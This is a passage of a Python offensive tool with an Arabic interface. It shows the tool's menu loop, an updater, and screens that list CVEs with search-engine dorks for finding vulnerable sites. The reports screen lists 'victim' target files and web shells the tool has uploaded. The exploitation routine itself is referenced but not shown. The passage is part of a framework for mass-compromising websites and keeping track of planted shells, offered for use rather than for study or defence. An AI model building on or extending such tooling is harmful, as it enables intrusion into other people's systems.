# ======================= [ عرض جميع الثغرات ] =======================
def show_all_exploits():
    """عرض كل الثغرات مع الدركات"""
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}{'═' * width}{col.RESET}")
    print(f"{col.KING_PURPLE}{'👑 قاعدة البيانات الملكية للثغرات'.center(width)}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * width}{col.RESET}")
    
    for cve_id, data in DORKS_DATABASE.items():
        risk_color = col.KING_RED if "CRITICAL" in data['risk'] else col.KING_YELLOW if "HIGH" in data['risk'] else col.KING_BLUE
        print(f"\n{col.KING_GOLD}┌{'─' * (width-2)}┐{col.RESET}")
        print(f"{col.KING_GOLD}│{col.RESET} {col.KING_WHITE}{cve_id}{col.RESET} - {data['name']}")
        print(f"{col.KING_GOLD}│{col.RESET}   {risk_color}{data['risk']}{col.RESET} | Score: {data['score']}")
        print(f"{col.KING_GOLD}│{col.RESET}   📁 مسار الفحص: {data['check']}")
        print(f"{col.KING_GOLD}│{col.RESET}   📊 عدد الدركات: {len(data['dorks'])}")
        print(f"{col.KING_GOLD}│{col.RESET}   🔍 أول درك: {data['dorks'][0]}")
        print(f"{col.KING_GOLD}└{'─' * (width-2)}┘{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ التقارير الملكية ] =======================
def show_king_reports():
    """عرض التقارير الملكية"""
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}{'═' * width}{col.RESET}")
    print(f"{col.KING_PURPLE}{'📊 التقارير الملكية'.center(width)}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * width}{col.RESET}")
    
    # عرض الأهداف الثغرية
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    victims = [f for f in os.listdir(targets_dir) if f.startswith('targets_')]
    
    if victims:
        print(f"\n{col.KING_GREEN}🎯 ملفات الأهداف:{col.RESET}")
        for v in victims[-5:]:
            size = os.path.getsize(os.path.join(targets_dir, v))
            print(f"  {col.KING_GOLD}📄{col.RESET} {v} ({size} بايت)")
    
    # عرض الشيلات
    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
    if os.path.exists(shells_file):
        print(f"\n{col.KING_RED}💀 الشيلات المرفوعة:{col.RESET}")
        with open(shells_file, 'r') as f:
            for line in f.readlines()[-5:]:
                print(f"  {col.KING_GOLD}🐚{col.RESET} {line.strip()}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ تحديث الملك ] =======================
def king_update():
    """تحديث الأداة بشكل ملكي"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 جاري التحديث الملكي...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    result = os.system("git pull origin main --allow-unrelated-histories")
    if result == 0:
        print(f"{col.KING_GREEN}✅ تم التحديث بنجاح إلى الإصدار {VERSION}!{col.RESET}")
    else:
        print(f"{col.KING_RED}❌ فشل التحديث! حاول يدوياً: git pull origin main{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ الدالة الرئيسية ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    while True:
        try:
            print_king_banner()
            print_king_menu()
            choice = input(f"\n{col.KING_GOLD}👑 {DEVELOPER}@king> {col.RESET}")
            
            if choice == "1":
                king_search()
            elif choice == "2":
                print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير...{col.RESET}")
                input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
            elif choice == "3":
                print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير...{col.RESET}")
                input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
            elif choice == "4":
                show_king_reports()
            elif choice == "5":
                show_all_exploits()
            elif choice == "6":
                king_update()
            elif choice == "7":
                print(f"\n{col.KING_GREEN}{'═' * 60}{col.RESET}")
                print(f"{col.KING_PURPLE}👑 مع السلامة يا ملك! استمر في التألق 👑{col.RESET}")
                print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
                sys.exit(0)
            else:
                print(f"{col.KING_RED}❌ خيار غير صحيح!{col.RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{col.KING_YELLOW}⚠️ تم الإلغاء{col.RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main()